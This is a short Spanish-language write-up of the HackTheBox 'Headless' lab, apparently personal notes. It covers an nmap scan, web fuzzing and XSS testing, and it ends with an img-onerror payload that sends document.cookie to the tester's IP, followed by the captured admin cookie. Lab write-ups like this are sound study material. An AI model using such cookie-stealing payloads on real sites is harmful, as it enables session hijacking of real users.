#HTB - HEADLESS

## Enumeración de puertos/servicios

``` bash 
sudo nmap -sCVT 10.10.11.8
```

![[Pasted image 20240404160810.png]]

Podemos ver 2 puertos abiertos:
- 22 (SSH)
- 5000 (posiblemente una web)

Vamos a probar si funciona la ip con el puerto 5000.

![[Pasted image 20240404161047.png]]


Efectivamente funciona la web, una vez tenemos acceso a ella lo primero que vamos a hacer es realizar un fuzzing en busca de directorios:

![[Pasted image 20240404162710.png]]
## Detección de vulnerabilidades


![[Pasted image 20240404163854.png]]

![[Pasted image 20240404163806.png]]


``` javascript
<script>alert(‘XSS’)</script>
```


![[Pasted image 20240404163454.png]]

Después de probar con algunos xss decido probar por otro lado a ver si funciona.

![[Pasted image 20240404164540.png]]

![[Pasted image 20240404183654.png]]

![[Pasted image 20240404183642.png]]

``` javascript
<img src=x onerror=fetch('http://10.10.14.168/?cpplie='+document.cookie);>
```

![[Pasted image 20240404184159.png]]


![[Pasted image 20240404184144.png]]

cookie: "ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"

![[Pasted image 20240404184300.png]]
